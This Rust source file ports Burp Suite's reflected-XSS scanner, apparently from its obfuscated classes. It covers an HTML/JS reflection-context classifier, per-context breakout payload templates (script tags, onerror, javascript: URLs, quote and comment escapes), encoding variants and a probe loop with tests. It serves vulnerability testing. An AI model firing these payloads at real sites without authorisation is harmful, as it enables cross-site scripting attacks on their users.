//! Burp's XSS reflection-context classifier, ported from burp.Zueq.
//!
//! Burp's XSS check (burp.Zi6p -> Zgkd -> Zguu) first decides *where* a
//! reflected marker landed, as one of 26 context ids (burp.Zgd7.ZP), and
//! then runs the breakout handler for that context (burp.Zglf.Zt). This
//! module ports the classification:
//!
//! * inside a tag: tag name -> 2, attribute name -> 3, attribute value by
//!   quote (`"` `'` `` ` `` unquoted) -> 4/5/6/7, shifted to 8..11 for URL
//!   attributes that can run `javascript:` (Zueq.ZZ: src/data on
//!   iframe/object/embed/frame, href on a/math, formaction on button/input,
//!   action on form) and to 12..15 for event-handler attributes (Zueq.ZK,
//!   151 names decoded at runtime);
//! * comment -> 23;
//! * text, by the innermost open raw element (Zueq.ZH): script -> the JS
//!   scanner Zueq.Zu (`"` string 16, `'` string 17, `//` comment 24,
//!   `/* */` comment 25, code 18), xmp 20, noscript 21, title 22, else 19.

/// Event-handler attribute names (burp.Zueq.ZK, decoded at runtime).
const EVENT_HANDLERS: &str = include_str!("xss_event_handlers.txt");

fn is_event_handler(attr: &str) -> bool {
    EVENT_HANDLERS
        .lines()
        .any(|l| l.trim().eq_ignore_ascii_case(attr))
}

/// burp.Zueq.ZZ: attributes whose value is a navigable URL.
fn is_script_url_attr(tag: &str, attr: &str) -> bool {
    let (t, a) = (tag.to_ascii_lowercase(), attr.to_ascii_lowercase());
    ((a == "src" || a == "data") && matches!(t.as_str(), "iframe" | "object" | "embed" | "frame"))
        || (a == "href" && matches!(t.as_str(), "a" | "math"))
        || (a == "formaction" && matches!(t.as_str(), "button" | "input"))
        || (a == "action" && t == "form")
}

/// burp.Zueq.Zu: the JS lexical state at `pos` of a script body.
fn js_context(script: &str, pos: usize) -> u8 {
    let b = script.as_bytes();
    // 0 = in "..", 1 = in '..', 2 = code, 3 = // comment, 4 = /* comment
    let mut state = 2u8;
    let mut i = 0;
    while i < pos.min(b.len()) {
        let c = b[i];
        match state {
            2 => match c {
                b'"' => state = 0,
                b'\'' => state = 1,
                b'/' if b.get(i + 1) == Some(&b'/') => {
                    state = 3;
                    i += 1;
                }
                b'/' if b.get(i + 1) == Some(&b'*') => {
                    state = 4;
                    i += 1;
                }
                _ => {}
            },
            0 | 1 => {
                if c == b'\\' {
                    i += 1;
                } else if (state == 0 && c == b'"') || (state == 1 && c == b'\'') {
                    state = 2;
                }
            }
            3 => {
                if c == b'\n' {
                    state = 2;
                }
            }
            _ => {
                if c == b'*' && b.get(i + 1) == Some(&b'/') {
                    state = 2;
                    i += 1;
                }
            }
        }
        i += 1;
    }
    match state {
        0 => 16,
        1 => 17,
        3 => 24,
        4 => 25,
        _ => 18,
    }
}

/// The context id (burp.Zgd7.ZP) of the reflection at byte offset `pos`.
pub fn classify(body: &str, pos: usize) -> u8 {
    let b = body.as_bytes();
    let mut open: Vec<String> = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] != b'<' {
            // text run up to the next '<'
            let end = body[i..].find('<').map(|x| x + i).unwrap_or(b.len());
            if pos >= i && pos < end {
                return text_context(&open, body, i, pos);
            }
            i = end;
            continue;
        }
        if body[i..].starts_with("<!--") {
            let end = body[i + 4..]
                .find("-->")
                .map(|x| x + i + 7)
                .unwrap_or(b.len());
            if pos >= i && pos < end {
                return 23;
            }
            i = end;
            continue;
        }
        let gt = body[i..].find('>').map(|x| x + i).unwrap_or(b.len());
        let inner = &body[i + 1..gt.min(b.len())];
        let closing = inner.starts_with('/');
        let name_start = i + 1 + usize::from(closing);
        let name_len = body[name_start..gt]
            .find(|c: char| c.is_ascii_whitespace() || c == '/' || c == '>')
            .unwrap_or(gt - name_start);
        let tag = body[name_start..name_start + name_len].to_ascii_lowercase();
        if pos >= i && pos <= gt {
            if pos < name_start + name_len.max(1) {
                return 2;
            }
            return attr_context(body, &tag, name_start + name_len, gt, pos);
        }
        if closing {
            if let Some(k) = open.iter().rposition(|t| *t == tag) {
                open.truncate(k);
            }
        } else if !inner.trim_end().ends_with('/') && !tag.is_empty() {
            open.push(tag.clone());
            if tag == "script"
                || tag == "xmp"
                || tag == "title"
                || tag == "noscript"
                || tag == "style"
            {
                // raw text up to the matching close tag
                let close = format!("</{tag}");
                let start = gt + 1;
                let end = body[start..]
                    .to_ascii_lowercase()
                    .find(&close)
                    .map(|x| x + start)
                    .unwrap_or(b.len());
                if pos >= start && pos < end {
                    return text_context(&open, body, start, pos);
                }
                i = end;
                continue;
            }
        }
        i = gt + 1;
    }
    19
}

fn text_context(open: &[String], body: &str, start: usize, pos: usize) -> u8 {
    let has = |t: &str| open.iter().any(|o| o == t);
    if has("script") {
        js_context(&body[start..], pos - start)
    } else if has("xmp") {
        20
    } else if has("noscript") {
        21
    } else if has("title") {
        22
    } else {
        19
    }
}

fn attr_context(body: &str, tag: &str, from: usize, gt: usize, pos: usize) -> u8 {
    let b = body.as_bytes();
    let mut i = from;
    while i < gt {
        while i < gt && (b[i].is_ascii_whitespace() || b[i] == b'/') {
            i += 1;
        }
        let ns = i;
        while i < gt && !b[i].is_ascii_whitespace() && b[i] != b'=' && b[i] != b'/' {
            i += 1;
        }
        let name = &body[ns..i];
        if pos >= ns && pos < i.max(ns + 1) {
            return 3;
        }
        while i < gt && b[i].is_ascii_whitespace() {
            i += 1;
        }
        if i < gt && b[i] == b'=' {
            i += 1;
            while i < gt && b[i].is_ascii_whitespace() {
                i += 1;
            }
            let (quote, vs) = match b.get(i) {
                Some(b'"') => (0u8, i + 1),
                Some(b'\'') => (1, i + 1),
                Some(b'`') => (2, i + 1),
                _ => (3, i),
            };
            let ve = if quote < 3 {
                let q = b[i];
                body[vs..gt].find(q as char).map(|x| x + vs).unwrap_or(gt)
            } else {
                body[vs..gt]
                    .find(|c: char| c.is_ascii_whitespace())
                    .map(|x| x + vs)
                    .unwrap_or(gt)
            };
            if pos >= vs && pos <= ve {
                let base = if is_script_url_attr(tag, name) {
                    8
                } else if is_event_handler(name) {
                    12
                } else {
                    4
                };
                return base + quote;
            }
            i = ve + usize::from(quote < 3);
        }
        if i == ns {
            i += 1;
        }
    }
    3
}

// ================= XSS breakout payloads (burp.Zglf handler trees) =================

/// Burp's reflected-XSS PoCs (burp.Zglf.ZX, decoded at runtime).
pub const XSS_POCS: [&str; 5] = [
    "alert(1)",
    "confirm(1)",
    "prompt(1)",
    "document.location=1",
    "document.title=1",
];

/// A breakout template for one context, ported from the burp.Zuw7 leaf for
/// that context. `{P}` = PoC, `{M}`/`{M2}` = random markers. `signature` is a
/// substring whose unencoded survival proves the context was broken.
pub struct XssTemplate {
    pub template: &'static str,
    pub signature: &'static str,
}

const fn xt(template: &'static str, signature: &'static str) -> XssTemplate {
    XssTemplate {
        template,
        signature,
    }
}

/// Burp's breakout templates per context id (burp.Zgd7.ZP), in handler-tree
/// order (burp.Zw2t text breakout; burp.Zuce attribute breakout).
pub fn xss_templates(context: u8) -> Vec<XssTemplate> {
    let text = || {
        vec![
            xt("{M}<script>{P}</script>{M2}", "<script>"),
            xt("{M}<ScRiPt>{P}</ScRiPt>{M2}", "<ScRiPt>"),
            xt("{M}<img src=a onerror={P}>{M2}", "onerror="),
        ]
    };
    match context {
        19 | 0 | 2 | 3 => text(),
        4 => vec![
            xt("{M}\"><script>{P}</script>{M2}", "\"><script>"),
            xt("{M}\"><img src=a onerror={P}>{M2}", "\"><img"),
            xt("{M}\" a=b{M2}", "\" a=b"),
        ],
        5 => vec![
            xt("{M}'><script>{P}</script>{M2}", "'><script>"),
            xt("{M}'><img src=a onerror={P}>{M2}", "'><img"),
            xt("{M}' a=b{M2}", "' a=b"),
        ],
        6 => vec![
            xt("{M}`><script>{P}</script>{M2}", "`><script>"),
            xt("{M}`><img src=a onerror={P}>{M2}", "`><img"),
            xt("{M}` a=b{M2}", "` a=b"),
        ],
        7 => vec![xt("{M}><script>{P}</script>{M2}", "><script>")],
        8..=11 => vec![xt("javascript:{P}//{M}", "javascript:")],
        12 => vec![xt("{M}\" onclick={P} x=\"{M2}", "\" onclick=")],
        13 => vec![xt("{M}' onclick={P} x='{M2}", "' onclick=")],
        14 => vec![xt("{M}` onclick={P} x=`{M2}", "` onclick=")],
        15 => vec![xt("{M} onclick={P} {M2}", " onclick=")],
        16 => vec![xt("{M}\";{P}//{M2}", "\";"), xt("{M}\"-{P}-\"{M2}", "\"-")],
        17 => vec![xt("{M}';{P}//{M2}", "';"), xt("{M}'-{P}-'{M2}", "'-")],
        18 => vec![xt("{M};{P}//{M2}", ";")],
        20 => vec![xt("{M}</xmp><script>{P}</script>{M2}", "</xmp>")],
        21 => vec![xt("{M}</noscript><script>{P}</script>{M2}", "</noscript>")],
        22 => vec![xt("{M}</title><script>{P}</script>{M2}", "</title>")],
        23 => vec![xt("{M}--><script>{P}</script>{M2}", "-->")],
        24 => vec![xt("{M}\n{P}//{M2}", "\n")],
        25 => vec![xt("{M}*/{P}/*{M2}", "*/")],
        _ => vec![],
    }
}

pub struct XssHit {
    pub payload: String,
    pub context: u8,
}

/// burp.Zcyd chain: a payload is tried raw, then %xx (Zw9s mode 1), then
/// NUL-prefixed (mode 2).
/// burp.Zw9s.Zi: letters and digits kept, every other char as %xx.
fn zw9s_encode(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_alphanumeric() {
                c.to_string()
            } else {
                format!("%{:02x}", (c as u32) & 0xff)
            }
        })
        .collect()
}

fn xss_variants(payload: &str) -> Vec<String> {
    vec![
        payload.to_string(),
        zw9s_encode(payload),
        format!("\0{payload}"),
    ]
}

/// burp.Zi6p reflected XSS: classify where a marker reflects, then try that
/// context's breakout templates. A template succeeds when the whole expanded
/// payload survives unencoded in the response body (an approximation of
/// Burp's HTML re-parse, burp.Zi_x/Zw8c). Appended first, then replaced
/// (burp.Zguu APPEND then REPLACE).
pub fn run_xss_check<F: FnMut(&str) -> Option<Vec<u8>>>(
    value: &str,
    mut send: F,
) -> Option<XssHit> {
    let rnd = || {
        use rand::Rng;
        let mut g = rand::thread_rng();
        (0..8)
            .map(|_| (b'a' + g.gen_range(0..26)) as char)
            .collect::<String>()
    };
    let body_of = |r: &[u8]| {
        let p = crate::util::parse_http(r);
        String::from_utf8_lossy(&r[p.head_len.min(r.len())..]).into_owned()
    };
    for append in [true, false] {
        let marker = rnd();
        let probe = if append {
            format!("{value}{marker}")
        } else {
            marker.clone()
        };
        let Some(resp) = send(&probe) else { continue };
        let body = body_of(&resp);
        let Some(pos) = body.find(&marker) else {
            continue;
        };
        let context = classify(&body, pos);
        for t in xss_templates(context) {
            let (m, m2) = (rnd(), rnd());
            let expanded = t
                .template
                .replace("{P}", XSS_POCS[0])
                .replace("{M2}", &m2)
                .replace("{M}", &m);
            for variant in xss_variants(&expanded) {
                let v = if append {
                    format!("{value}{variant}")
                } else {
                    variant.clone()
                };
                let Some(r) = send(&v) else { continue };
                if body_of(&r).contains(&expanded) {
                    return Some(XssHit {
                        payload: v,
                        context,
                    });
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn xss_templates_cover_the_main_contexts() {
        // every context the classifier can emit has at least one template,
        // except the pure code context 18 which already executes.
        for c in [19u8, 4, 5, 6, 7, 8, 12, 16, 17, 20, 22, 23, 24, 25] {
            assert!(!xss_templates(c).is_empty(), "context {c} has no template");
        }
        // text breakout uses Burp's real <script>/<ScRiPt>/onerror payloads.
        let t: Vec<&str> = xss_templates(19).iter().map(|x| x.signature).collect();
        assert_eq!(t, vec!["<script>", "<ScRiPt>", "onerror="]);
    }

    #[test]
    fn xss_check_reports_only_real_breakouts() {
        // Reflects the value into HTML text with no encoding: vulnerable.
        let vuln = |v: &str| {
            Some(format!("HTTP/1.1 200 OK\r\n\r\n<html><body>Hi {v}</body></html>").into_bytes())
        };
        let hit = run_xss_check("name", vuln).expect("unencoded HTML text is XSS");
        assert_eq!(hit.context, 19);
        assert!(hit.payload.contains("<script>") || hit.payload.contains("onerror="));
        // HTML-encodes < and >: not exploitable, no report.
        let safe = |v: &str| {
            let e = v.replace('<', "&lt;").replace('>', "&gt;");
            Some(format!("HTTP/1.1 200 OK\r\n\r\n<html><body>Hi {e}</body></html>").into_bytes())
        };
        assert!(run_xss_check("name", safe).is_none());
        // Reflected inside a double-quoted attribute, quote not encoded: the
        // "><script> breakout survives.
        let attr =
            |v: &str| Some(format!("HTTP/1.1 200 OK\r\n\r\n<input value=\"{v}\">").into_bytes());
        assert!(run_xss_check("q", attr).is_some());
        // Same attribute but the quote is encoded: no breakout.
        let attr_safe = |v: &str| {
            Some(
                format!(
                    "HTTP/1.1 200 OK\r\n\r\n<input value=\"{}\">",
                    v.replace('"', "&quot;")
                )
                .into_bytes(),
            )
        };
        assert!(run_xss_check("q", attr_safe).is_none());
    }

    fn at(html: &str) -> u8 {
        classify(&html.replace('X', "zz"), html.find('X').unwrap())
    }

    #[test]
    fn classifies_like_burp_zueq() {
        assert_eq!(at("<p>hello X</p>"), 19);
        assert_eq!(at("<title>X</title>"), 22);
        assert_eq!(at("<xmp>X</xmp>"), 20);
        assert_eq!(at("<noscript>X</noscript>"), 21);
        assert_eq!(at("<!-- X -->"), 23);
        assert_eq!(at("<X a=1>"), 2);
        assert_eq!(at("<p X=1>"), 3);
        assert_eq!(at("<p class=\"X\">"), 4);
        assert_eq!(at("<p class='X'>"), 5);
        assert_eq!(at("<p class=`X`>"), 6);
        assert_eq!(at("<p class=X>"), 7);
        assert_eq!(at("<a href=\"X\">"), 8, "href on a can run javascript:");
        assert_eq!(at("<iframe src='X'>"), 9);
        assert_eq!(at("<form action=X>"), 11);
        assert_eq!(
            at("<img src=\"X\">"),
            4,
            "img src is not a script URL in Burp's list"
        );
        assert_eq!(at("<div onclick=\"X\">"), 12);
        assert_eq!(at("<div onmouseover='X'>"), 13);
        assert_eq!(at("<script>var a = \"X\";</script>"), 16);
        assert_eq!(at("<script>var a = 'X';</script>"), 17);
        assert_eq!(at("<script>var a = X;</script>"), 18);
        assert_eq!(at("<script>// X\n</script>"), 24);
        assert_eq!(at("<script>/* X */</script>"), 25);
        assert_eq!(
            at("<script>var s='a\\'X';</script>"),
            17,
            "escaped quote stays in the string"
        );
    }
}
